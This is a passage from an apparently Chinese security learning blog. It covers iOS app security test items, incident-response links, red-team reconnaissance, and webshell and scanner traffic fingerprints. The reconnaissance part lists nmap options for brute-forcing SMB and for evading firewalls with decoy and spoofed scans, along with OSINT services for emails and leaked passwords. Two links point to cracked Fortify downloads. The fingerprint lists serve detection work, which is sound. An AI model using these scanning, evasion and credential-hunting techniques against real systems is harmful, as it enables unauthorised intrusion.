<td align="center">可执行文件可以被反编译。攻击者可通过该问题看到客户端的逻辑。</td>
</tr>
<tr>
<td align="center">日志敏感信息泄露</td>
<td align="center">如果开发人员在日志中打印信息，则可能造成内网ip、用户名、密码、内部链接等敏感信息泄露。</td>
</tr>
<tr>
<td align="center">应用数据存储安全</td>
<td align="center">检查客户端程序本地存储文件，防止账号密码等敏感信息保存在本地，造成敏感信息泄露的风险。</td>
</tr>
<tr>
<td align="center">越狱环境检测</td>
<td align="center">越狱的环境默认是不安全的，是打破了苹果的生态系统的。如果应用未能在运行之初就检测当前系统是否为越狱环境，那么就会存在一定的风险。</td>
</tr>
<tr>
<td align="center">动态调试检测（可选）</td>
<td align="center">若客户端允许动态调试，攻击者可通过对客户端进行加解密分析、业务流程分析等。</td>
</tr>
<tr>
<td align="center">内存敏感信息检测</td>
<td align="center">一些重要数据，会被临时存放在内存里面。通过读取客户端内存，寻找内存中可能存在的敏感信息（卡号、明文密码等）。</td>
</tr>
<tr>
<td align="center">输入记录保护</td>
<td align="center">在系统中安装了键盘记录软件（可以在非越狱状态运行），则使用系统键盘输入的内容易被键盘记录程序记录，导致内容泄露。</td>
</tr>
<tr>
<td align="center">屏幕录像保护</td>
<td align="center">测试通过截图功能，是否可以截到用户密码输入框（登录密码、交易密码等）的明文密码。</td>
</tr>
</tbody></table>
<h3 id="网络通信安全"><a href="#网络通信安全" class="headerlink" title="网络通信安全"></a>网络通信安全</h3><table>
<thead>
<tr>
<th align="center">网络通信安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">通信协议安全</td>
<td align="center">APP使用HTTP协议进行通信过程中可能会遭受中间人攻击，威胁数据安全。</td>
</tr>
<tr>
<td align="center">通信数据加密</td>
<td align="center">查看客户端在登录&#x2F;找回密码等关键业务的报文，是否对报文整体，或关键字段进行加密。</td>
</tr>
<tr>
<td align="center">证书强校验检测</td>
<td align="center">验证客户端是否存在忽略服务端证书校验的问题，客户端没有对服务器进行强校验或者没有在校验错误时候对用户进行提示，攻击者可以通过伪造证书对服务器进行攻击。</td>
</tr>
<tr>
<td align="center">软件升级缺陷</td>
<td align="center">程序在进行版本更新的时候，会向服务器请求一个跳转地址，如果修改返回包中的地址，存在钓鱼攻击的风险。</td>
</tr>
</tbody></table>
<h3 id="安全策略检测"><a href="#安全策略检测" class="headerlink" title="安全策略检测"></a>安全策略检测</h3><table>
<thead>
<tr>
<th align="center">安全策略检测</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">软键盘随机化排布</td>
<td align="center">在用户输入敏感信息时，如果系统未使用自定义软键盘，而是使用了系统自带键盘，或者自定义软键盘未随机，那么恶意程序就可能对屏幕点击进行劫持，导致用户敏感信息泄露。</td>
</tr>
<tr>
<td align="center">后台背景模糊</td>
<td align="center">在切换至多任务状态栏时，APP背景内容是否模糊处理，防止敏感信息泄露。</td>
</tr>
<tr>
<td align="center">手势密码检测</td>
<td align="center">检测APP内手势密码的复杂度要求，手势密码修改是否需要校验密码，本地是否存储了明文手势密码的信息等。</td>
</tr>
<tr>
<td align="center">密码修改验证</td>
<td align="center">检测是否需要输入旧密码验证来修改密码。</td>
</tr>
<tr>
<td align="center">密码复杂度检验</td>
<td align="center">通常客户端没有设置禁止修改口令的强弱判断，导致用户有时贪图方便修改成简单密钥使攻击者容易通过弱口令进入帐号进行非法操作。</td>
</tr>
<tr>
<td align="center">认证失败锁定</td>
<td align="center">测试账户在登录时候多次输入密码错误或修改密码时候多次错误是否会导致账号被锁定。</td>
</tr>
<tr>
<td align="center">UI敏感信息安全</td>
<td align="center">登录过程中会为了友好，提示“用户名错误”或者“密码错误”。此时就可以通过这种“友好”的提示检查项目是否存在相关用户名，并且在账号体系不存在锁定的情况下相对容易地进行密码爆破。</td>
</tr>
<tr>
<td align="center">信息屏蔽检测</td>
<td align="center">检测程序中显示敏感信息是否使用 * 进行部分屏蔽，防止在被截屏获取敏感信息，同时也防止他人窥探手机屏幕得到敏感信息。</td>
</tr>
<tr>
<td align="center">会话超时策略</td>
<td align="center">程序在长时间不操作时候或者在长时间，若程序没有自动锁定或者退出登录，则有可能导致在这种情况下造成数据窃取。</td>
</tr>
<tr>
<td align="center">会话固定风险</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
<tr>
<td align="center">锁屏与会话锁定策略</td>
<td align="center">测试程序在锁屏解锁之后是否会进行会话锁定，并在重新解锁之后要求用户重新进行身份验证。</td>
</tr>
<tr>
<td align="center">TLS&#x2F;SSL协议与加密套件</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
</tbody></table>
<h2 id="威胁分析与处置"><a href="#威胁分析与处置" class="headerlink" title="威胁分析与处置"></a>威胁分析与处置</h2><p>主要解释了平台怎么使用。</p>
<p>APT：高级持续性威胁（Advanced Persistent Threat，APT），又叫高级长期威胁，是一种复杂的、持续的网络攻击，包含三个要素：高级、长期、威胁。高级是指执行APT攻击需要比传统攻击更高的定制程度和复杂程度，需要花费大量时间和资源来研究确定系统内部的漏洞；长期是为了达到特定目的，过程中“放长线”，持续监控目标，对目标保有长期的访问权；威胁强调的是人为参与策划的攻击，攻击目标是高价值的组织，攻击一旦得手，往往会给攻击目标造成巨大的经济损失或政治影响，乃至于毁灭性打击。</p>
<p>参考：<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html</a></p>
<p><a href="https://www.zhihu.com/question/28881041">https://www.zhihu.com/question/28881041</a></p>
<h2 id="应急响应分析"><a href="#应急响应分析" class="headerlink" title="应急响应分析"></a>应急响应分析</h2><p>视频包括模板介绍及案例分析</p>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/">前言 · 应急响应实战笔记 (bypass007.github.io)</a>  这个说得特别详细</p>
<p>下面是部分介绍应急响应的链接：</p>
<p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/weixin_40412037/article/details/114282426">一次真实的应急响应案例——篡改页面、挖矿(sysupdate、networkservice)（含靶场环境）_应急响应靶场_W小哥1的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/articles/web/216939.html">应急响应实例分享 - FreeBuf网络安全行业门户</a></p>
<h2 id="网络探针"><a href="#网络探针" class="headerlink" title="网络探针"></a>网络探针</h2><p>什么是网络探针？网络探针是接入控制的有效手段！网络探针就是一个被赋予了特殊功能的BTA桌面安全助理程序，它能够检测到在特定的网络区间内（一般为内网的同一C类网段）没有安装和运行BTA桌面安全助理程序的其它计算机，并采取技术措施自动限制或阻断这些计算机的网络通信。这些操作是由网络探针自动完成的，不需要管理人员的手工操作，也不需要对相关网络设备的配置进行修改。</p>
<p>人会说谎，流量不会 </p>
<p><a href="https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82">https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82</a></p>
<h2 id="红队-信息收集进阶"><a href="#红队-信息收集进阶" class="headerlink" title="红队-信息收集进阶"></a>红队-信息收集进阶</h2><p>ATT&amp;CK：<a href="https://blog.csdn.net/weixin_43965597/article/details/125926620%EF%BC%88%E6%B2%A1%E4%BB%94%E7%BB%86%E7%A0%94%E7%A9%B6%E8%BF%99%E4%B8%AA%EF%BC%8C%E4%BB%A5%E5%90%8E%E9%9C%80%E8%A6%81%E5%86%8D%E7%9C%8B%EF%BC%89">https://blog.csdn.net/weixin_43965597/article/details/125926620（没仔细研究这个，以后需要再看）</a></p>
<h3 id="OSINT简介"><a href="#OSINT简介" class="headerlink" title="OSINT简介"></a>OSINT简介</h3><p>开源网络情报(Open source intelligence),简称OSINT,是美国中央情报局(CIA)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报OSINT特点：因为开源、宽泛；各类情报&#x2F;信息都可收集</p>
<p>之后看酷学院补充</p>
<h3 id="端口扫描-nmap-amp-masscan"><a href="#端口扫描-nmap-amp-masscan" class="headerlink" title="端口扫描-nmap&amp;masscan"></a>端口扫描-nmap&amp;masscan</h3><p>url链接：https:&#x2F;nmap.org&#x2F;<br>Nmap可以扫ip可以扫域名，<br>-V显示扫描过程；<br>-A进攻式扫描；<br>-p1-65535,全端：<br>O探测操作系统：<br>-nP不用ping；<br>-Pn&#x3D;-P0不进行主机发现直接扫描：<br>-top-ports100排名前100端口；<br>-iL filename从文件中读取目标进行扫描：<br><strong>扫描方式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT TCP扫描（稳定，相较于SYN次选），三次握手；</span><br><span class="line">-sS用SYN扫描（速度快、隐蔽），半开放式扫描，无完整握手；</span><br><span class="line">-sU用UDP扫描（扫描慢）；</span><br><span class="line">-sA用ACK扫描；</span><br><span class="line">-sX用Xmas扫描；</span><br><span class="line">-sF用FIN扫描（可绕过一些防火墙）；</span><br><span class="line">-sP用ping,确认主机是否在线；</span><br><span class="line">-sV扫描主机和端口的版本</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-script部分漏洞利用</span><br><span class="line">-script all使用所有脚本进行扫描</span><br><span class="line">-script auth自动识别</span><br><span class="line">-script vuln对常见漏洞扫描</span><br><span class="line">--script smb-brute对用户名密码进行爆破</span><br></pre></td></tr></table></figure>

<p><strong>绕防火墙：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-DRND:10(随机产生10个虚拟ip对目标进行扫描)</span><br><span class="line">-f发送很小的包（类似mtu)</span><br><span class="line">-mtu8(8、16、24、32等8的倍数)</span><br><span class="line">-S源地址伪装</span><br><span class="line">-source-port53用53端口对目标进行扫描</span><br><span class="line">-data-length20发送指定长度的包去探测</span><br><span class="line">-sI agent-ip以agent-ip的身份去扫描（默认80端口）</span><br></pre></td></tr></table></figure>

<h4 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h4><p>url链接：https:&#x2F;github.com&#x2F;projectdiscovery&#x2F;subfinder<br>功能：通过调用各个api接口进行子域名收集（调用包括Sublist3r、crtsh、fofa、spyses等等）</p>
<p>（没用过，以后有机会试试，一般我用layer</p>
<h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>url链接：https:&#x2F;github.com&#x2F;shmilylty.&#x2F;OneForAll<br>功能：通过DNS、搜索引擎、爬子域等方式进行检索</p>
<h4 id="Sublist3r-amp-子域名挖掘机"><a href="#Sublist3r-amp-子域名挖掘机" class="headerlink" title="Sublist3r&amp;子域名挖掘机"></a>Sublist3r&amp;子域名挖掘机</h4><p>url链接：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>  功能：通过搜索引擎爬取，多了一个检查端口</p>
<p>url链接：<a href="https://www.webshell.cc/6384.htm">https://www.webshell.cc/6384.htm</a>  功能：输入直接查询子域名（爆破枚举</p>
<h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>内容安全策略(CSP):开发者明确告诉客户端（制定比较严格的策略和规侧）<br>内容安全策略(CSP)定义了Content-Security-Policy HTTP头，它允许我们创建可信内容源的白名单，并指示浏览器只执行或呈现来自这些源的资源<br>我们可以查看HTTP的Content-Security-Policy:字段来搜集子域名信息。</p>
<h4 id="whois-x2F-DNS查询-centralops"><a href="#whois-x2F-DNS查询-centralops" class="headerlink" title="whois&#x2F;DNS查询-centralops"></a>whois&#x2F;DNS查询-centralops</h4><p>url链接：<a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a></p>
<h4 id="whois-x2F-DNS查询-dnsdumpster"><a href="#whois-x2F-DNS查询-dnsdumpster" class="headerlink" title="whois&#x2F;DNS查询-dnsdumpster"></a>whois&#x2F;DNS查询-dnsdumpster</h4><p>url链接：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>功能：查询DNS解析记录，其中里面包含其他接口（如：查询共享DNS主机、共享IP主机、端口探测等端口)，但是会招出查询次数</p>
<h4 id="ip反查域名-rapiddns"><a href="#ip反查域名-rapiddns" class="headerlink" title="ip反查域名-rapiddns"></a>ip反查域名-rapiddns</h4><p>url链接：<a href="https://rapiddns.io/">https://rapiddns.io/</a><br>功能：查询ip归属地、网络中心，反查网站、旁站C段查询</p>
<h4 id="ip反查域名-IP138"><a href="#ip反查域名-IP138" class="headerlink" title="ip反查域名-IP138"></a>ip反查域名-IP138</h4><p>url链接：<a href="https://www.ip138.com/iplookup.asp">https://www.ip138.com/iplookup.asp</a><br>功能：查询同IP下都有哪些web站点</p>
<h4 id="CDN-chinaz"><a href="#CDN-chinaz" class="headerlink" title="CDN-chinaz"></a>CDN-chinaz</h4><p>url链接：<a href="https://cdn.chinaz.com/">https://cdn.chinaz.com/</a><br>功能：查询是否有CDN及CDN提供商名字</p>
<h4 id="数字证书-censys-amp-crt-sh"><a href="#数字证书-censys-amp-crt-sh" class="headerlink" title="数字证书-censys&amp;crt.sh"></a>数字证书-censys&amp;crt.sh</h4><p>url链接：<a href="https://search.censys.io/">https://search.censys.io/</a><br>选择证书查询即可，可查询自签名，过期证书、未过期证书、发行人，以及邮箱</p>
<p>url链接：<a href="https://crt.sh/">https://crt.sh/</a><br>属于域名即可查询</p>
<h4 id="搜索引擎-google-amp-fofa"><a href="#搜索引擎-google-amp-fofa" class="headerlink" title="搜索引擎-google&amp;fofa"></a>搜索引擎-google&amp;fofa</h4><h4 id="搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse"><a href="#搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse" class="headerlink" title="搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse"></a>搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse</h4><h4 id="社交媒体-rocketreach"><a href="#社交媒体-rocketreach" class="headerlink" title="社交媒体-rocketreach"></a>社交媒体-rocketreach</h4><p>url链接：<a href="https://rocketreach.co/">https://rocketreach.co/</a><br>使用twitter、.googlel账号登陆即可查询</p>
<p>通过ip查社交媒体</p>
<h4 id="邮件信息收集-hunter-amp-phonebook-amp-infoga"><a href="#邮件信息收集-hunter-amp-phonebook-amp-infoga" class="headerlink" title="邮件信息收集-hunter&amp;phonebook&amp;infoga"></a>邮件信息收集-hunter&amp;phonebook&amp;infoga</h4><p>url链接：<a href="https://hunter.io/">https://hunter.io/</a><br>输入需要查询的邮件后缀，即可查看部分，然后再点击来源即可看到详情</p>
<p>url链接：<a href="https://phonebook.cz/">https://phonebook.cz/</a>  （效果很好）<br>输入需要查询的邮件后缀，即可查询邮件名（网站中有其他功能但是都不太好用），该网站的数据是从<a href="https://intelx.io/%E4%B8%AD%E6%89%BE%E7%9A%84%E6%95%B0%E6%8D%AE">https://intelx.io/中找的数据</a></p>
<p>url链接：<a href="https://github.com/m4IIok/infoga">https://github.com/m4IIok/infoga</a><br>功能：从不同公共来源（搜索引擎、pgp密钥服务器和shodan)收集电子邮件帐户信息(IP、主机名、国家&#x2F;地区…)的工具，并使用haveibeenpned.com API检查电子邮件是否泄露</p>
<h4 id="临时邮件-fakemailgenerator-amp-kuku"><a href="#临时邮件-fakemailgenerator-amp-kuku" class="headerlink" title="临时邮件-fakemailgenerator&amp;kuku"></a>临时邮件-fakemailgenerator&amp;kuku</h4><p>url链接：<a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a><br>功能：生成假造身份后可获得一个邮件地址，该邮件地址可以收邮件内容</p>
<p>url链接：<a href="https://m.kuku.lu/">https://m.kuku.lu/</a><br>直接使用，可以首发邮件且无需注册</p>
<h4 id="商业记录-天眼查-x2F-爱企查-x2F-企查查"><a href="#商业记录-天眼查-x2F-爱企查-x2F-企查查" class="headerlink" title="商业记录-天眼查&#x2F;爱企查&#x2F;企查查"></a>商业记录-天眼查&#x2F;爱企查&#x2F;企查查</h4><p>url链接：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>url链接：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br>url链接：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>股权穿透、子母公司、相关产品和地址、备案信息查询等信息</p>
<h4 id="IP定位-ipuu"><a href="#IP定位-ipuu" class="headerlink" title="IP定位-ipuu"></a>IP定位-ipuu</h4><p>url链接：<a href="https://www.ipuu.net/">https://www.ipuu.net</a><br>高精度定位P所在区域，需要登陆后查询（高精度查询每日有查询上限）</p>
<h4 id="综合信息收集-xray"><a href="#综合信息收集-xray" class="headerlink" title="综合信息收集-xray"></a>综合信息收集-xray</h4><p>详细使用文档：<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
<h4 id="综合信息收集-Maltego"><a href="#综合信息收集-Maltego" class="headerlink" title="综合信息收集-Maltego"></a>综合信息收集-Maltego</h4><p>url链接：<a href="https://www.maltego.com/">https://www.maltego.com/</a><br>在官网可以直接下载，Mac、Windows、Linux版本(kali自带)<br>在官网注册一个账号即可直接使用（分收费版、免费版）<br>鼠标右键即可出来<br>可以查dns解析、子域名、邮箱关联等信息</p>
<h4 id="代码信息泄露-github-amp-searchcode"><a href="#代码信息泄露-github-amp-searchcode" class="headerlink" title="代码信息泄露-github&amp;searchcode"></a>代码信息泄露-github&amp;searchcode</h4><p><a href="https://searchcode.com/">https://searchcode.com/</a></p>
<h4 id="密码信息泄漏-intelx"><a href="#密码信息泄漏-intelx" class="headerlink" title="密码信息泄漏-intelx"></a>密码信息泄漏-intelx</h4><p>url链接：<a href="https://intelx.io/">https://intelx.io/</a><br>随便注册一个账号即可查询</p>
<h4 id="交通信息收集-火车地铁"><a href="#交通信息收集-火车地铁" class="headerlink" title="交通信息收集-火车地铁"></a>交通信息收集-火车地铁</h4><p>url链接：<a href="https://www.openrailwaymap.org/">https://www.openrailwaymap.org/</a><br>查线路情况，高速段落、专用线段落</p>
<h4 id="交通信息收集-飞机"><a href="#交通信息收集-飞机" class="headerlink" title="交通信息收集-飞机"></a>交通信息收集-飞机</h4><p>url链接：<br>航旅纵横app<br><a href="https://www.flightradar24.com/">https://www.flightradar24.com/</a><br>直接章询即可，包括每一趟航天高度、时速、现在位置</p>
<h2 id="web测试-业务逻辑漏洞"><a href="#web测试-业务逻辑漏洞" class="headerlink" title="web测试-业务逻辑漏洞"></a>web测试-业务逻辑漏洞</h2><p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">常见的业务逻辑漏洞-整合篇_vlan911的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/m0_57751431/article/details/119333788">业务逻辑漏洞总结_Andy数宇的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">https://blog.csdn.net/weixin_48421613/article/details/121008379</a></p>
<h2 id="APP测试"><a href="#APP测试" class="headerlink" title="APP测试"></a>APP测试</h2><h3 id="安卓客户端测试流程"><a href="#安卓客户端测试流程" class="headerlink" title="安卓客户端测试流程"></a>安卓客户端测试流程</h3><p>客户端静态安全<br>客户端数据安全<br>客户端运行时安全<br>安全策略<br>通信安全</p>
<h3 id="IOS客户端测试流程"><a href="#IOS客户端测试流程" class="headerlink" title="IOS客户端测试流程"></a>IOS客户端测试流程</h3><p>客户端安全<br>网络通信安全<br>安全策略检测<br>可选测试项</p>
<h3 id="Drozer使用"><a href="#Drozer使用" class="headerlink" title="Drozer使用"></a>Drozer使用</h3><h3 id="安卓脱壳入门"><a href="#安卓脱壳入门" class="headerlink" title="安卓脱壳入门"></a>安卓脱壳入门</h3><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h3><p><a href="https://www.ddosi.org/fortify/">Fortify SCA 20.2.2 cracked Fortify破解版 - 🔰雨苁ℒ🔰 (ddosi.org)</a></p>
<p><a href="https://cn-sec.com/archives/1496150.html">fortify_sca_22.2-Windows-linux破解版 | CN-SEC 中文网</a></p>
<p><a href="https://blog.csdn.net/qq_40597962/article/details/118490818">Fortify介绍及使用教程_fortify 使用方法_「已注销」的博客-CSDN博客</a></p>
<p>[第37篇：fortify代码审计工具的使用技巧(1)-审计java代码过程 - 腾讯云开发者社区-腾讯云 (tencent.com)](<a href="https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify%E9%BB%98%E8%AE%A4%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8D%E6%98%AFUTF-8%EF%BC%8C%E5%AF%BC%E8%87%B4%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E7%9A%84Java%E4%BB%A3%E7%A0%81%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E3%80%82">https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify默认的编码不是UTF-8，导致部分中文的Java代码会出现乱码问题。</a> 如果是单文件乱码，可以使用 Edit 选项卡下的,Set Encoding 进行设置， 鼠标光标在右侧代码框内点击一下，否则此项功能不能用 ，但是这种方法只适用于单个文件的乱码解决。)</p>
<p><a href="https://www.cnblogs.com/happylumei/p/16731407.html">【安全测试】【fortify】fortify设置中文语言 - 码上起舞 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>安服</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析与应急响应</title>
    <url>/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_32393893/article/details/117574848">CTF之流量分析_ctf 流量分析_shy014的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_53577336/article/details/125048353">Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_冰蝎流量特征_告白热的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/eternitymd/article/details/124492261">菜刀、冰蝎、蚁剑、哥斯拉的流量特征_蚁剑流量特征_呜呼起飞~的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_42880719/article/details/122148345">ctfshow 摆烂杯 writeup_jiajia-cp-1_是Mumuzi的博客-CSDN博客</a></p>
<span id="more"></span>

<h2 id="常见指纹"><a href="#常见指纹" class="headerlink" title="常见指纹"></a>常见指纹</h2><p>过滤语句：http contains “sqlmap”</p>
<p>Awvs:<br>AWVS扫描器在请求的URL，Headers, Body三项里随机包含了能代表自己的特征信息</p>
<p>&lt;1&gt; Url: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix-wvs-test-for-some-inexistent-file</span><br><span class="line">by_wvs</span><br><span class="line">acunetix_wvs_security_testacunetix</span><br><span class="line">acunetix_wvs</span><br><span class="line">acunetix_test</span><br></pre></td></tr></table></figure>

<p>&lt;2&gt; Headers:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Acunetix-Aspect-Password:</span><br><span class="line">Cookie: acunetixCookie</span><br><span class="line">Location: acunetix_wvs_security_testX-Forwarded-Host: acunetix_wvs_security_testX-Forwarded-For: acunetix_wvs_security_testHost: acunetix_wvs_security_testCookie: acunetix_wvs_security_testCookie: acunetix</span><br><span class="line">Accept: acunetix/wvs</span><br><span class="line">Origin: acunetix_wvs_security_testReferer: acunetix_wvs_security_testVia: acunetix_wvs_security_testAccept-Language: acunetix_wvs_security_testClient-IP: acunetix_wvs_security_testHTTP_AUTH_PASSWD: acunetix</span><br><span class="line">User-Agent: acunetix_wvs_security_testAcunetix-Aspect-Queries:任意值</span><br><span class="line">Acunetix-Aspect:任意值</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt; Body </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix_wvs_security_testacunetix</span><br></pre></td></tr></table></figure>



<p>Appscan:</p>
<p>Appscan依然在请求的URL，Headers，Body三项里随机包含了能代表自己的特征信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;Url</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">Content-Type: Appscan</span><br><span class="line">Content-Type: AppScanHeader</span><br><span class="line">Accept: Appscan</span><br><span class="line">User-Agent:Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>



<p>Nessus:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt; Url</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>



<ul>
<li>x_forwarded_for:nessus</li>
<li>referer:nessus</li>
<li>host:nessus</li>
</ul>
<p>sqlmap:</p>
<ul>
<li>User-Agent:sqlmap1.2.8#stable</li>
</ul>
<p>Netsparker: </p>
<ul>
<li>X-Scanner:NetsparkerLocation:</li>
<li>NetsparkerAccept:netsparker&#x2F;chechCookie:</li>
<li>netsparkerCookie:NETSPARKER</li>
</ul>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>1.请求包中会有eval，assert, base64的特征字符（这里如果用eval方法就是eval ,如果是assert方法就是assert）<br>2.payload为base64加密，且为默认为&amp;z0&#x3D;QGluaV9zZXQ… 参数z0对应$_POST[z0]接收到的数据<br>且固定为QGluaV9zZXQ开头</p>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码</p>
<p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息</p>
<p>第二次请求，会把主机目录列出来</p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>使用 aes 加密发起三次请求</p>
<p>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的</p>
<p>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
<h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>使用 aes 加密发起两次请求</p>
<p>3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为取连接密码的 md5 加密值的前 16 位作为密钥</p>
<p>一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.请求数据包中的content-type字段常见为application/octet-stream；</span><br><span class="line"> 2.内置16个user-agent头</span><br><span class="line"> 3.content-lengt]请求长度，对于密钥交互，获取基本信息来讲，payload都为定长。</span><br></pre></td></tr></table></figure>

